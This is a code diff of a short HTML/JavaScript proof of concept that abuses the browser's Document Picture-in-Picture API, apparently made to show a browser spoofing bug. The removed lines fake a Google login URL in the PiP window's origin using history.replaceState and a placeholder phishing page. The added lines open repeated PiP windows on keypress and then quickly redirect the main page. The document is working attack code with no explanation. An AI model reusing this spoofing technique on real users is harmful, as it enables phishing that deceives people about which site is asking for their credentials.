@@ -1,30 +1,24 @@
-<style>
-    #content {
-        display: none;
-    }
-</style>
-
-<button id="button">Open PIP</button>
-
-<div id="content">
-    phishing page content here
-</div>
+<h1>Hold Enter</h1>
 
 <script>
+    let i = 0;
     const pipOpen = async () => {
-        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+        if (i > 5) return;
+        i++;
 
-        const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 330,
-            height: 317
+        documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 400,
+        }).then(pipWindow => {
+            pipWindow.location.href = 'https://example.com';
         });
-        
-        setTimeout(() => {
-            history.replaceState(null, '', '/');
-        }, 1000);
 
-        pipWindow.document.body.append(content);
+        setTimeout(() => {
+            location.href = 'https://google.com/x';
+        }, 100);
     };
 
-    button.onclick = pipOpen;
+    document.body.onkeypress = () => {
+        pipOpen();
+    };
 </script>
